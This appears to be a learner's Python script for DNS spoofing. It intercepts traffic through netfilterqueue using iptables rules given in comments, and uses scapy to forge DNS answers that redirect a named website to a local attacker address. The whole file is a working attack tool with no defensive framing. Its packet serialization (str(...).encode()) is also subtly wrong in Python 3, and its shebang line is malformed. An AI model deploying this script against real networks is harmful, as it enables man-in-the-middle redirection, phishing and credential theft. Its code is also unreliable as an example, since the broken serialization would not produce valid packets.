##!/usr/bin/env python
import scapy.all as scapy
import netfilterqueue

#python3

#to get the ip of the website run the python file and than form iptables and then ping the website

#remort machine
# create quesue where the packets comimg from the host computer get stored --in terminal
# iptables -I FORWARD -j NFQUEUE --queue-num [queuenumber in which wanna store]----nothing to do with python but terminal

#local machine
# iptables -I OUTPUT -j NFQUEUE --queue-num [queuenumber in which wanna store]----nothing to do with python but terminal
# iptables -I INPUT -j NFQUEUE --queue-num [queuenumber in which wanna store]----nothing to do with python but terminal

def process_packet(packet):
    #to convert to scapy packet
    scapy_pkt=scapy.IP(packet.get_payload())
    if scapy_pkt.haslayer(scapy.DNSRR):
        qname=scapy_pkt[scapy.DNSQR].qname
        s="www.vbcvit.com"
        if s.encode() in qname:
            print("[+] Spoofing target")
            answer=scapy.DNSRR(rrname=qname, rdata="192.168.1.8")
            scapy_pkt[scapy.DNS].an=answer
            #to modify the number of answers sent
            scapy_pkt[scapy.DNS].ancount=1
            # to prevent the pkt from corruption we remove the checksum and answer length
            del scapy_pkt[scapy.IP].len
            del scapy_pkt[scapy.IP].chksum
            del scapy_pkt[scapy.UDP].len
            del scapy_pkt[scapy.UDP].chksum

            # convert changes to string and give to packet
            p=str(scapy_pkt)
            packet.set_payload(p.encode())

    # #to let the packet pass
    packet.accept()
    # # to drop the packet no internet
    # packet.drop()
queue=netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

# flush packet queue after executionnetcut
#iptables --flush